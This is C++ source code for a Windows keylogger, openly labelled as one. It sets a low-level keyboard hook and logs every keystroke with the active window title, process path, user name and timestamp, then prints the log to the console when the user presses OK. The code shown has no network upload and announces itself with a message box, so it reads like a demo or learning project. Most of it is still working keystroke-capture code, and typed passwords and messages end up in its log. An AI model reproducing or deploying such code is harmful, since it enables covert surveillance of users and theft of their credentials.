#include <winsock2.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <Lmcons.h>
#include <string>
#include <map>
#include <vector>

#define MAX_PATH 256		
#define MAX_DATE 80

using namespace std;
typedef struct keylogger_log_struct {
	int pid;														/* Current window process ID */
	wstring original_filename;										/* Current window executable name */
	wstring exec_path;												/* Current window executable path */
	map<std::wstring, pair<std::wstring, std::wstring>> keystrokes;	/* <Window title, <keystrokes, date>> dictionary */
	wstring date;													/* Last-modified date */
	string uname;													/* Current user-name */
} LOG_STRUCT;

vector<LOG_STRUCT*> all_data;  // MUST be global in order for free_vector to success !

void free_vector()
{
	if (!all_data.empty())
		for (int index = 0; index < all_data.size(); index++)
		{	
			printf("\n| PID: %d", all_data.at(index)->pid);
			printf("\n| Original filename: ");
			wprintf(all_data.at(index)->original_filename.c_str());
			printf("| Executable name: ");
			wprintf(all_data.at(index)->exec_path.c_str());
			printf("| Date: ");
			wprintf(all_data.at(index)->date.c_str());
			printf("| Username: ");
			puts(all_data.at(index)->uname.c_str());
			printf("| Keystrokes: \n");
			for (auto iterator = all_data.at(index)->keystrokes.begin(); iterator != all_data.at(index)->keystrokes.end(); iterator++) {
				wprintf(L"\t<Application name>: %s\n", iterator->first.wstring::c_str());
				wprintf(L"\t<Keystrokes>: %s\n", iterator->second.first.wstring::c_str());
				wprintf(L"\t<Last-modified>: %s\n", iterator->second.second.wstring::c_str());
				printf("-------------------------------------------------------------------------------\n");
				// iterator->first = key
				// iterator->second = value
			}
		}
}

inline wstring getCurrentDate()
{
	time_t t = time(0);   // Get current time
	char str_time[20];
	struct tm *now = localtime(&t);
	strftime(str_time, sizeof(str_time), "%d-%m-%Y %H:%M:%S", now);
	string time_s(str_time);
	return (wstring(time_s.begin(), time_s.end()));
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
{	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	wchar_t exe_path[MAX_PATH + 1], wndw_title[MAX_PATH];
	char username[UNLEN + 1];
	vector<LOG_STRUCT*> all_data1 = all_data;
	DWORD processid, username_len = UNLEN + 1;
	HANDLE window_proc;
	HWND hwnd = GetForegroundWindow(); // Gets a handler for the current window

	GetWindowThreadProcessId(hwnd, &processid);  // Retrieve current window process ID
	memset(exe_path, 0, sizeof(exe_path));
	window_proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE | PROCESS_ALL_ACCESS, FALSE, processid);
	GetWindowTextW(hwnd, wndw_title, sizeof(wndw_title));  // Retrieve current window title text
	if (0 == GetModuleFileNameExW(window_proc, NULL, exe_path, MAX_PATH)) {  // Retrieve current window executable filename (@TODO:fix!)
		printf("adam adam adam adam: %d\n", GetLastError());
	}
	GetUserName(username, &username_len);  // Retrieve current user name
	CloseHandle(window_proc);

	//@TODO: fix procces name method

	// Switch case the virtual key code 
	if (wParam == WM_KEYDOWN) {

		std::wstring key;
		switch (p->vkCode)
		{
			case VK_LSHIFT:							break;
			case VK_RSHIFT:							break;
			case VK_CAPITAL:	key = L"[CAPLOCK]";	break;
			case VK_NUMLOCK:	key = L"[NUMLOCK]";	break;
			case VK_LCONTROL:	key = L"[LCTRL]";	break;
			case VK_RCONTROL:	key = L"[RCTRL]";	break;
			case VK_LWIN:		key = L"[LWIN]";	break;
			case VK_RWIN:		key = L"[RWIN]";	break;
			case VK_NUMPAD0:	key = L"[0]";		break;
			case VK_NUMPAD1:	key = L"[1]";		break;
			case VK_NUMPAD2:	key = L"[2]";		break;
			case VK_NUMPAD3:	key = L"[3]";		break;
			case VK_NUMPAD4:	key = L"[4]";		break;
			case VK_NUMPAD5:	key = L"[5]";		break;
			case VK_NUMPAD6:	key = L"[6]";		break;
			case VK_NUMPAD7:	key = L"[7]";		break;
			case VK_NUMPAD8:	key = L"[8]";		break;
			case VK_NUMPAD9:	key = L"[9]";		break;
			case VK_DIVIDE:		key = L"[/]";		break;
			case VK_MULTIPLY:	key = L"[*]";		break;
			case VK_ADD:		key = L"[+]";		break;
			case VK_SUBTRACT:	key = L"[-]";		break;
			case VK_SPACE:		key = L" ";			break;
			case VK_SNAPSHOT:	key = L"[PRTSCRN]";	break;
			case VK_INSERT:		key = L"[INSERT]";	break;
			case VK_END:		key = L"[END]";		break;
			case VK_PRINT:		key = L"[PRINT]";	break;
			case VK_DELETE:		key = L"[DEL]";		break;
			case VK_BACK:		key = L"[BK]";		break;
			case VK_LMENU:		key = L"[LALT]";		break;
			case VK_RMENU:		key = L"[RALT]";		break;
			case VK_TAB:		key = L"[TAB]";		break;
			case VK_RETURN:		key = L"[ENTER]";	break;
			case VK_OEM_1:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L":"; }
				else { key = L";"; }
				break;
			case VK_OEM_2:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"?"; }
				else { key = L"/"; }
				break;
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"~"; }
				else { key = L"`"; }
				break;
			case VK_OEM_4:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"{"; }
				else { key = L"["; }
				break;
			case VK_OEM_5:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"|"; }
				else { key = L"\\"; }
				break;
			case VK_OEM_6:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"}"; }
				else { key = L"]"; }
				break;
			case VK_OEM_7:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"\""; }
				else { key = L"'"; }
				break;
			case VK_OEM_8:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"?"; }
				else { key = L"/"; }
				break;
			case VK_OEM_COMMA:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"<"; }
				else { key = L","; }
				break;
			case VK_OEM_PERIOD:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L">"; }
				else { key = L"."; }
				break;
			case VK_OEM_MINUS:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"_"; }
				else { key = L"-"; }
				break;
			case VK_OEM_PLUS:
				if (GetAsyncKeyState(VK_SHIFT)) { key = L"+"; }
				else { key = L"= "; }
				break;

			default:
				if (GetKeyState(VK_CAPITAL) & 0x0001 != 0) 
					key = std::wstring(1, (char)(p->vkCode));
			
				else if (GetAsyncKeyState(VK_SHIFT) & (1 << 16))
				{
					if (p->vkCode == 48)	  { key = L")"; }
					else if (p->vkCode == 49) { key = L"!"; }
					else if (p->vkCode == 50) { key = L"@"; }
					else if (p->vkCode == 51) { key = L"#"; }
					else if (p->vkCode == 52) { key = L"$"; }
					else if (p->vkCode == 53) { key = L"%"; }
					else if (p->vkCode == 54) { key = L"^"; }
					else if (p->vkCode == 55) { key = L"&"; }
					else if (p->vkCode == 56) { key = L"*"; }
					else if (p->vkCode == 57) { key = L"("; }
					else { key = std::wstring(1, (char)(p->vkCode)); }
				}
				else { key = std::wstring(1, (char)(p->vkCode + 32)); }
				break;
		}
		
		if (all_data.empty())
			goto new_statement;

		// Check if there's aleady a log struct for the current process (by process ID)
		for (auto all_data_iterator = all_data.begin(); all_data_iterator != all_data.end(); all_data_iterator++)
		{
			if (exe_path == (*(all_data_iterator))->exec_path) // If there's already a struct for the process
			{
				(*(all_data_iterator))->date = getCurrentDate();
				if ((*(all_data_iterator))->keystrokes.find(wndw_title) == (*(all_data_iterator))->keystrokes.end())	// If the key (window title) doesn't exist
					(*(all_data_iterator))->keystrokes.insert(pair<std::wstring, pair<std::wstring, std::wstring>>(wndw_title, pair<std::wstring, std::wstring>(key, getCurrentDate())));

				else
				{
					try {
						(*(all_data_iterator))->keystrokes.at(wndw_title).first.append(key);  // Write key to struct
						(*(all_data_iterator))->keystrokes.at(wndw_title).second = getCurrentDate();  // Write key to struct
					}
					catch (std::length_error)
					{
						fprintf(stderr, "Error writing to struct: keystrokes string exceeded MAX_SIZE!");
					}
				}
				return CallNextHookEx(NULL, nCode, wParam, lParam);  // Call next hook in the chain
			}
		}
	
	new_statement:
		//LOG_STRUCT* tmplog = all_data[all_data.size()];
		LOG_STRUCT* tmplog = new LOG_STRUCT;  // Create new struct for the process
		tmplog->date = getCurrentDate();
		tmplog->exec_path = wstring(exe_path);
		tmplog->original_filename = wstring(exe_path).substr(wstring(exe_path).find_last_of(L"\\") + 1, wstring(exe_path).length() - 1);
		tmplog->pid = processid;
		tmplog->uname = string(username);
		tmplog->keystrokes.insert(pair<std::wstring, pair<std::wstring, std::wstring>>(wndw_title, pair<std::wstring, std::wstring>(key, getCurrentDate())));
		all_data.push_back(tmplog);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);  // Call next hook in the chain
}

int main()
{
	//Set keyboard hook
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyboardProc,
		NULL,
		0);

	Sleep(1000); // pause for 1 second
	printf("------------> Keylogger initialized\n");
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);
	UnhookWindowsHookEx(keyboardHook);	
	free_vector();
	system("pause");
	exit(0);
}
